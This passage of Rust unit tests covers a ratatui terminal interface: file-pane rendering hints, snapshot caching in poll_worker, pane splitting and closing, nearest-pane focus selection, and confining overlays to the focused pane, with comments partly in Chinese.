        term.draw(|f| render(&mut app, f)).unwrap();
        let rendered: String = term
            .backend()
            .buffer()
            .content()
            .iter()
            .map(|c| c.symbol())
            .collect();
        assert!(
            rendered.contains("use /ls to populate"),
            "empty Files pane must keep the hint"
        );
    }

    #[test]
    fn poll_worker_mirrors_files_into_view_cache() {
        // BUG 2 mirror contract: when a ParsedTable::Files snapshot arrives,
        // poll_worker must populate files_view (so the pane keeps the data after
        // q/Esc closes the overlay). Build a live channel, send a snapshot, and
        // assert the cache is populated + the overlay opened (both paths fed).
        let (snap_tx, snap_rx) = std::sync::mpsc::channel();
        let (_cmd_tx, cmd_rx) = std::sync::mpsc::channel();
        let mut app = App::new(Bridge {
            snapshots: snap_rx,
            cmds: _cmd_tx,
        });
        let _ = cmd_rx; // silence unused; receiver unused in this test
        snap_tx
            .send(rest::Snapshot {
                sessions: Vec::new(),
                log_lines: Vec::new(),
                connected: true,
                parsed: Some(rest::ParsedTable::Files(vec![FileEntry {
                    name: "cached.txt".into(),
                    size: 7,
                    is_dir: false,
                    modified: "Feb 02".into(),
                }])),
            })
            .unwrap();
        app.poll_worker();
        assert_eq!(
            app.files_view.len(),
            1,
            "files_view must mirror the parsed /ls result"
        );
        assert_eq!(app.files_view[0].name, "cached.txt");
        assert!(
            matches!(app.overlay, Overlay::Files(_)),
            "overlay path must still open as before"
        );
    }

    #[test]
    fn pane_split_close_focus_cycle() {
        // 完整生命周期：split → close → 焦点回退
        let mut app = fake_app();
        assert_eq!(app.pane_tree.leaf_count(), 1);
        // split：当前最大 id=1，next_id()=2
        let new_id = app.pane_tree.next_id(); // == 2
        app.pane_tree =
            app.pane_tree
                .clone()
                .split(app.focused_pane, panes::SplitDir::Columns, new_id);
        app.focused_pane = new_id;
        assert_eq!(app.pane_tree.leaf_count(), 2);
        // close 新叶
        app.pane_tree = app.pane_tree.clone().close(new_id);
        app.focused_pane = app
            .pane_tree
            .leaves()
            .first()
            .map(|(id, _)| *id)
            .unwrap_or(1);
        assert_eq!(app.pane_tree.leaf_count(), 1);
    }

    #[test]
    fn poll_worker_handles_empty_channel_without_blocking() {
        let mut app = fake_app();
        // No snapshots sent; this must return immediately, not hang.
        app.poll_worker();
        assert!(!app.connected);
        assert!(app.stream.is_empty());
    }

    /// UX-S4：pick_nearest_leaf 选屏幕中心距离被关叶最近的剩余叶。
    #[test]
    fn pick_nearest_chooses_spatial_neighbor() {
        use ratatui::layout::Rect;
        // 被关叶在右上角 (x=40,y=0,w=40,h=12)，剩余两个叶：
        // 左下 (0,0,40,24) 中心 (20,12)；右下 (40,12,40,12) 中心 (60,18)。
        // 被关中心 (60,6)。右下距离 √(0²+12²)=12，左下距离 √(40²+6²)≈40。
        // 应选右下（距离更近），即兄弟而非左下角。
        let remaining = vec![(1, Rect::new(0, 0, 40, 24)), (3, Rect::new(40, 12, 40, 12))];
        let closed = Some(Rect::new(40, 0, 40, 12));
        assert_eq!(pick_nearest_leaf(&remaining, closed), Some(3));
    }

    /// pick_nearest 无剩余叶时返回 None。
    #[test]
    fn pick_nearest_empty_returns_none() {
        let remaining: Vec<(usize, ratatui::layout::Rect)> = vec![];
        assert_eq!(pick_nearest_leaf(&remaining, None), None);
    }

    /// overlay 限制在焦点窗格内，不遮另一半（核心修复回归测试）。
    /// 分屏后开 Files overlay，验证 overlay 内容（文件名）只出现在焦点窗格列范围，
    /// 非焦点窗格区域不含 overlay 内容（保持可见）。
    #[test]
    fn overlay_does_not_cover_other_pane_in_split() {
        let mut app = fake_app();
        // 左右分屏：新叶 id=2 在左（x=0..40），原叶 id=1 在右（x=40..80）。
        // focused_pane 默认 = 1（原叶，右侧），所以 overlay 在右半。
        let nid = app.pane_tree.next_id();
        app.pane_tree =
            app.pane_tree
                .clone()
                .split(app.focused_pane, panes::SplitDir::Columns, nid);
        // 确认焦点窗格在哪侧：layout 后查 focused_pane=1 的 rect。
        app.overlay = Overlay::Files(vec![FileEntry {
            name: "ZZZ_OVERLAY_MARKER".into(),
            size: 1,
            is_dir: false,
            modified: "x".into(),
        }]);
        let backend = TestBackend::new(80, 24);
        let mut term = Terminal::new(backend).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
        let buf = term.backend().buffer();

        // 非焦点窗格是 id=2（左侧 x=0..40）。扫描左侧，确认不含 overlay marker。
        for y in 1u16..21u16 {
            for x in 0u16..40u16 {
                let cell = &buf[(x, y)];
                let sym = cell.symbol();
                assert!(
                    !sym.contains('Z'),
                    "overlay 内容泄漏到非焦点窗格 x={x} y={y}: {sym:?}"
                );
            }
        }
        // 焦点窗格（右侧）应含 overlay marker（证明 overlay 确实渲染了）。
        let right_half: String = (1u16..21u16)
            .flat_map(|y| (40u16..80u16).map(move |x| (x, y)))
            .map(|(x, y)| buf[(x, y)].symbol().chars().next().unwrap_or(' '))
            .collect();
        assert!(right_half.contains('Z'), "焦点窗格应含 overlay marker");
    }

    /// overlay 的 focused_pane_rect 正确指向焦点窗格（非全屏）。
    #[test]
    fn overlay_focused_pane_rect_is_pane_not_fullscreen() {
        let mut app = fake_app();
        let nid = app.pane_tree.next_id();
        app.pane_tree =
            app.pane_tree
                .clone()
                .split(app.focused_pane, panes::SplitDir::Columns, nid);
        app.overlay = Overlay::Files(vec![]);
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
        // 焦点窗格 rect 宽度应 < 80（不是全屏）。
        assert!(
            app.focused_pane_rect.width < 80,
            "focused_pane_rect 应是窗格大小非全屏，got width={}",
            app.focused_pane_rect.width
        );
    }
}
